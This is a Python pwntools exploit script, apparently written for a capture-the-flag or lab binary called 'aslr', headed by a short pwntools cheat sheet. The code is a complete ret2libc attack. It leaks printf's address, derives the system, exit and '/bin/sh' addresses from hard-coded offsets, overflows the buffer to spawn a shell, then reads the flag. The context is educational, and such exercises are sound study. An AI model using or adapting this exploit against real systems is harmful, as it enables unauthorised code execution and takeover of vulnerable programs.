#!/usr/bin/python3

"""
PWNTOOLS - documentation available at http://docs.pwntools.com/en/stable/

Local vs remote
    - Work with local binary:   sh = process("./<target>")
    - Local with arguments:     sh = process(["./<target>", "<argument>"])
    - Work with remote service: sh = remote("<IP>", <port>)

Communication with binary/service:
    - sh.recv()     = receive up to n bytes (with default n = 4096)
    - sh.recvline() = receive a line
    - sh.sendline() = send a line
    ...

You can switch into GDB:
    - gdb.attach(sh): attach to running process
    ...

Switch from script to interactive mode:
    - sh.interactive()

Script output:
    - log.info("bla bla bla")
    ...

Packing:
    p32(0xdeadbeef) => '\xef\xbe\xad\xde'

FAQ:
    What is "[*] Got EOF while reading in interactive"?
    -> Connection terminated (remote services usually disconnect you after a few seconds of inactivity)

"""

#libc_addr  =0xf7db5000  info proc mappings
#system_addr=0xf7df9a00  p system
#exit_addr  =0xf7dec570  p exit
#printf_addr=0xf7e08d80  p printf
#/binsh_addr=0xf7f4332b  grep /bin/sh

#printf-system_offset= 0x13e50
#printf-exit= 0x20bf0
#printf-binsh= -0x12ad6f


from pwn import *
import re

sh = process("./aslr")

#Write 116 times AAAAAAAAAAAAAA to stdin
sh.sendline(0x70*b'\x41')
#recv printf address
output = sh.recvline()

#parsing address
printf_addr= int(re.search(r"0x[a-f0-9]{8}",output.decode()).group(0),16)
system_addr	= printf_addr - 0x13e50
exit_addr	= printf_addr - 0x20bf0
binsh_addr	= printf_addr + 0x12ad6f

shellcode= 0x74*b'\x41'+ p32(system_addr) + p32(exit_addr) + p32(binsh_addr)
sh.sendline(shellcode)

#Read line from stdout
output = sh.recvline()

sh.sendline("cat flag")
output = sh.recvline()



# Switch to interactive mode so you can manually send input to stdin.
# This may be useful when developing your exploit or to play around..
sh.interactive()